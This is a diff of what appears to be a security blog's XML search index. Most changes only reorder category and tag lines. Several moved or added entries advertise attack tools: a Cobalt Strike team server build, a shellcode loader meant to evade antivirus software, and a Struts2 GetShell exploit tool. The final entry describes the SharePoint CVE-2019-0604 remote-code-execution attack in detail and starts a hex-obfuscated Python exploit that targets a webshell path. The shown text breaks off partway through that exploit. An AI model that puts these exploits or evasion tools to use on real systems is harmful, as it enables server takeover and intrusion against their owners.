@@ -999,8 +999,8 @@
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -1544,8 +1544,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -1590,8 +1590,8 @@ Windows Server, version 2004 (Server Core installation)</code></pre><h3 id="模�
 </div>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>内网渗透</tag>
@@ -2086,8 +2086,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <category>嗅探</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Sniffer</tag>
         <tag>FtpSniffer</tag>
         <tag>HttpSniffer</tag>
@@ -2110,8 +2110,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
         <category>信息收集</category>
         <category>编程</category>
@@ -2310,8 +2310,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>内网渗透</category>
         <category>远程执行</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -2416,8 +2416,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -2679,8 +2679,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>密码</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -2898,8 +2898,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -2984,9 +2984,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Cobalt Strike</category>
       </categories>
       <tags>
+        <tag>Ladon</tag>
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
-        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -3028,13 +3028,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
+        <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -3087,8 +3087,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>.NET</category>
         <category>源码</category>
-        <category>编程</category>
         <category>ShellCode</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>.NET</tag>
@@ -3150,14 +3150,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
+        <category>Exp</category>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ActiveMQ</tag>
         <tag>CVE-2016-3088</tag>
@@ -3174,14 +3174,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
+        <category>Exp</category>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>ThinkPHP</tag>
       </tags>
@@ -3199,14 +3199,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
+        <category>Exp</category>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -3230,14 +3230,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
+        <category>Exp</category>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>PhpStudy</tag>
       </tags>
@@ -3369,8 +3369,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>PowerShell</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>PowerShell</tag>
       </tags>
   </entry>
@@ -3408,14 +3408,14 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Exp: <a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">https://github.com/k8gege/SolrExp</a><br>Cscan: <a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan</a></p>
 ]]></content>
       <categories>
-        <category>工具</category>
         <category>Exp</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
-        <tag>Ladon</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
+        <tag>Exp</tag>
+        <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
   </entry>
@@ -3433,9 +3433,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
+        <category>Exp</category>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Exp</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3698,8 +3698,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <category>Kali</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Kali</tag>
         <tag>Scanner</tag>
       </tags>
@@ -3755,8 +3755,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -3794,55 +3794,6 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
         <tag>Ladon</tag>
         <tag>Kali</tag>
         <tag>PowerShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
-    <url>/p/9cffe32c.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
-<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
-<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
-<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
-<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
-<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
-<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
-<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
-<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
-<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Cobalt Strike</category>
-        <category>Metasploit</category>
-        <category>ShellCode</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -3906,13 +3857,62 @@ Microsoft Windows 10 for 32-bit Systems 0
 
 <pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
       <categories>
-        <category>工具</category>
         <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>Exp</tag>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
+    <url>/p/9cffe32c.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
+<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
+<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/scencode.png"></p>
+<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
+<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
+<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
+<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
+<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
+<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
+<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -3952,12 +3952,12 @@ Microsoft Windows 10 for 32-bit Systems 0
 <p>
 功能:&nbsp;<br>===========================================================================================<br>[+]新增任意文件上传小马 (解决S2奇葩环境菜刀无法上传文件 &amp; 乱码问题)<br>[+]10 S2-045&nbsp; CVE-2017-5638&nbsp;&nbsp; 支持执行CMD命令<br>[+]9 devMode CVE-xxxx-xxxx&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]8 S2-037&nbsp; CVE-2016-4438&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]7 S2-032&nbsp; CVE-2016-3081&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]6 S2-020&nbsp; CVE-2014-0094&nbsp;&nbsp; 支持GetShell (此洞特殊,EXP集成在飞刀)<br>[+]5 S2-019&nbsp; CVE-2013-4316&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]4 S2-016&nbsp; CVE-2013-2251&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]3 S2-013&nbsp; CVE-2013-1966&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]2 S2-009&nbsp; CVE-2011-3923&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令<br>[+]1 S2-005&nbsp; CVE-2010-1870&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令/列文件目录<br>===========================================================================================<br>CVE-2016-4438&nbsp; 影响版本：Struts 2.3.20 - Struts 2.3.28.1&nbsp; 官方公告：http://struts.apache.org/docs/s2-037.html<br>CVE-2016-3081&nbsp; 影响版本：Struts 2.3.18 &ndash; Struts 2.3.28&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-032.html<br>CVE-2014-0094&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.16&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-020.html<br>CVE-2013-4316&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15.1&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-019.html<br>CVE-2013-2251&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-016.html<br>CVE-2013-1966&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.14&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-013.html<br>CVE-2011-3923&nbsp; 影响版本：Struts 2.0.0 -&nbsp; Struts 2.3.1.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-009.html<br>CVE-2010-1870&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.1.8.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.2.x/docs/s2-005.html<br>===========================================================================================<br><br><span style="color: #ff00ff;">下载地址:</span><br>文件: K8_Struts2_EXP.exe<br>SHA1:3DAF7AD4FB7440C33E66613E6075A0F02EA9DF18<br>平台:&nbsp;XP/Vista/Win7/Win8/2000/2003/2008/2012<br>猛击:<a href="http://pan.baidu.com/s/1cpcQeE" rel="nofollow" target="_blank">http://pan.baidu.com/s/1cpcQeE</a><br><br><a id="cb_post_title_url" class="postTitle2" href="https://www.cnblogs.com/k8gege/p/10261217.html" target="_blank" rel="noopener">[原创]Struts2奇葩环境任意文件上传工具(解决菜刀无法传文件或上传乱码等问题)</a><br>https://www.cnblogs.com/k8gege/p/10261217.html</p>]]></content>
       <categories>
-        <category>工具</category>
         <category>Exp</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>Struts2</tag>
         <tag>GetShell</tag>
       </tags>
@@ -3974,8 +3974,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -4048,12 +4048,12 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
         <category>Ladon</category>
         <category>源码</category>
-        <category>编程</category>
         <category>Python</category>
+        <category>编程</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -4095,6 +4095,105 @@ PortTranS.exe 8000 338
       <tags>
         <tag>Tool</tag>
         <tag>PortTran</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
+    <url>/p/e896a7d1.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
+<p><span style="font-size: 16px;">Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</span></p>
+<p><span style="font-size: 16px;">Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。</span></p>
+<p><span style="font-size: 18px;"><strong>影响版本：</strong></span></p>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">Microsoft SharePoint Enterprise Server 2016</span></div>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Foundation 2013 SP1</span></div>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">harePoint Server 2010 SP2</span></div>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Server 2019。</span></div>
+<h2 id="h2-2"><span style="font-size: 18px;">攻击入口</span></h2>
+<p><span style="font-size: 16px;">ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。</span></p>
+<p><span style="font-size: 16px;">该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种：</span></p>
+<pre><span style="font-size: 16px;"><code class="hljs css">&middot; <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in             <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.dll
+
+<p>&middot; <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.dll<br></span></span></span></span></span></span></span></span></span></span></p></span></span></span></span></span></span></span></span></code></span></pre><p></p>
+<p><span style="font-size: 16px;">利用第一种 <span style="font-size: 16px;">PickerDialogType </span>类型</span></p>
+<p>&nbsp;</p>
+<h2 id="h2-3">PoC</h2>
+<p><span style="font-size: 16px;">当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 &ldquo;__&rdquo; 为开头时(类似于&ldquo;_dummy&rdquo;)，</span></p>
+<p><span style="font-size: 16px;">EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。</span></p>
+<p><span style="font-size: 16px;">这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。</span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong>补充：</strong></span></p>
+<p><span style="font-size: 16px;">作者说只要构造一个XML序列化的Payload就可以了，但是Payload提交到哪里呢？</span></p>
+<p><span style="font-size: 16px;">原文中只说了一半,完整POST以及具体参数如下：</span></p>
+<p><span style="font-size: 16px;">URL： /Picker.aspx?PickerDialogType=控件的程序集限定名&nbsp; <br></span></p>
+<p><span style="font-size: 16px;">参数： <span style="font-size: 16px;">ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=<span style="font-size: 16px;">payload </span></span></span></p>
+<p><span style="font-size: 16px;"><span style="font-size: 16px;">实际上还需访问<span style="font-size: 16px;">Picker.aspx</span>附带的其它参数，测试我不附带其它参数时提交表单是失败的。</span></span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 16px;">此漏洞分析文章出来时就想搭环境测试了，第一天下载APP安装后发现下错了<span style="font-size: 16px;">，</span></span></p>
+<p><span style="font-size: 16px;">加上项目未遇到该程序，搭环境也浪费时间懒得弄，就暂时丢一边了。</span></p>
+<p><span style="font-size: 16px;">今天发现上周已经弄了一半，又重新研究了一下。</span></p>
+<p>&nbsp;</p>
+<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">详情请看原文，我想以下文章应该不少人看过了吧，所谓原理很多人都能说得出来</span></strong></p>
+<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">就是都在等一个真正能用的EXP吧，哈哈哈，我就是传说中的云黑客&ldquo;鸡你太美&rdquo;！</span></strong></p>
+<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">原文(英文): <a href="https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" target="_blank">https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability</a></span></p>
+<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">译文(中文): <a href="https://www.anquanke.com/post/id/173476" target="_blank">https://www.anquanke.com/post/id/173476</a></span></p>
+<p>&nbsp;</p>
+<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 18px;"><strong>EXP</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#cve-2019-0604 SharePoint RCE exploit
+#date: 20190618 #author: <a href="https://www.cnblogs.com/k8gege" target="_blank">k8gege</a>
+import urllib
+import urllib2
+import sys
+import requests
+url0 = sys.argv[1]
+url1 = '/_layouts/15/Picker.aspx?PickerDialogType='
+url = url0 + url1 
+shellurl=url0+'/_layouts/15/ua.aspx'
+exp='\x63\x76\x65\x2D\x32\x30\x31\x39\x2D\x30\x36\x30\x34\x20\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x20\x52\x43\x45\x20\x65\x78\x70\x6C\x6F\x69\x74'
+paySpanData='\x63\x74\x6C\x30\x30\x24\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E\x24\x63\x74\x6C\x30\x35\x24\x68\x69\x64\x64\x65\x6E\x53\x70\x61\x6E\x44\x61\x74\x61';
+paySection='\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E'
+ct1='\x63\x74\x6C\x30\x30\x24'
+ct2='\x24\x63\x74\x6C\x30\x35'
+spver = '\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2E\x57\x65\x62\x43\x6F\x6E\x74\x72\x6F\x6C\x73\x2E\x49\x74\x65\x6D\x50\x69\x63\x6B\x65\x72\x44\x69\x61\x6C\x6F\x67\x2C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2C\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x35\x2E\x30\x2E\x30\x2E\x30\x2C\x43\x75\x6C\x74\x75\x72\x65\x3D\x6E\x65\x75\x74\x72\x61\x6C\x2C\x50\x75\x62\x6C\x69\x63\x4B\x65\x79\x54\x6F\x6B\x65\x6E\x3D\x37\x31\x65\x39\x62\x63\x65\x31\x31\x31\x65\x39\x34\x32\x39\x63'
+uapay='\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74'
